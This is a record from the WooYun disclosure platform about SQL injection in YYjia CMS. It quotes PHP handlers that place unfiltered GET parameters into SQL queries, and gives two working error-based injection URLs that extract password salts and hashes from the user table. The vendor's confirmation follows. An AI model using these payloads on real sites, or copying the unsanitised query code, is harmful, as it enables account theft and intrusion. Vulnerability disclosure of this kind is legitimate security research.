{"id": 39200, "wybug_id": "wooyun-2015-094583", "wybug_title": "YYjia cms前台过滤不严，导致注入#2", "wybug_corp": "yyjia.com", "wybug_author": "webos", "wybug_date": "2015-02-04 10:58", "wybug_open_date": "2015-05-08 09:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向公众公开  简要描述： YYjia cms前台过滤不严，导致注入#2 详细说明：  又看了看这个文件，发现还有漏洞：\nelseif($caozuo==\"delapp\"){\t\t$uploadid=$_GET['id'];\t\t$lx=$_GET[lx];\t\t$sql=\"delete from user_data where zxid='\".$uploadid.\"' and type='2'\";\t\t$_SGLOBAL['db']->query($sql);\t\t$sql=\"select * from \".tname('appinfo').\" where id=$uploadid\";\t\t$appinfo=$_SGLOBAL['db']->fetch_array($_SGLOBAL['db']->query($sql));\t\t$logofile=S_ROOT.$appinfo['logo'];\t\tif($logofile){\t\t\tunlink($logofile);\t\t}\t\tif($appinfo[type]==2){\t\t\t$dsql=\"select imgurl from androidinfo where appid='\".$uploadid.\"'\";\t\t}elseif($appinfo[type]==1){\t\t\t$dsql=\"select imgurl from appleinfo where appid='\".$uploadid.\"'\";\t\t}elseif($appinfo[type]==3){\t\t\t$dsql=\"select imgurl from wpinfo where appid='\".$uploadid.\"'\";\t\t}\t\t$dquery=$_SGLOBAL['db']->query($dsql);\t\t$andrvalue=$_SGLOBAL['db']->fetch_array($dquery);\t\t$filepics=explode(\"@@@\",$andrvalue[imgurl]);\t\tforeach($filepics as $dkey=>$dval){\t\t\t$dval=substr($dval,19);\t\t\t$filepic=S_ROOT.$dval;\t\t\tif($filepic){\t\t\t\tunlink($filepic);\t\t\t}\t\t}\t\t$sql1=\"delete from appinfo where id=\".$uploadid;\t\t$_SGLOBAL['db']->query($sql1);\t\tif($lx==\"1\"){\t\t\t$sql2=\"delete from appleinfo where appid=\".$uploadid;\t\t\t$_SGLOBAL['db']->query($sql2);\t\t}elseif($lx=='2'){\t\t\t$sql3=\"delete from androidinfo where appid=\".$uploadid;\t\t\t$_SGLOBAL['db']->query($sql3);\t\t}elseif($lx=='3'){\t\t\t$sql4=\"delete from wpinfo where appid=\".$uploadid;\t\t\t$_SGLOBAL['db']->query($sql4);\t\t}\t\tshowmessage(\"成功删除记录\",\"index.php?ac=user&op=myapps\");\t}\n白花花的一片几乎全是没有过滤的\nhttp://192.168.218.13:805//index.php?ac=user&caozuo=delapp&id=-1%20and%20updatexml(1,concat(0x17,(select%20salt%20from%20`user`+limit+0,1)),0)%23\n\n\n\n\n进到后台了：\n\n还有一处：\nif($caozuo){\tif($caozuo==\"delcom\"){\t\t\t$commentid=$_GET['commentid'];\t\tif($commentid){\t\t\t$sql=\"delete from user_data where uid='\".$uid.\"' and type='4' and zxid=\".$commentid;\t\t}else{\t\t\t$sql=\"delete from user_data where uid='\".$uid.\"' and type='4'\";\t\t}\t\t\t\t$aa=$_SGLOBAL['db']->query($sql);\t\t\tshowmessage(\"记录删除成功\",$_SERVER['HTTP_REFERER']);\t\t\t}\n访问：\n/index.php?ac=user&caozuo=delcom&commentid=-1%20and%20updatexml(1,concat(0x17,(select%20password%20from%20`user`+limit+0,1)),0)%23\n\n\n\n\n(45app就是yyjia的演示站了)：）你再不修，我还有大招放   漏洞证明：     修复方案：     版权声明：转载请注明来源 webos@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-02-07 09:41 厂商回复： 修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}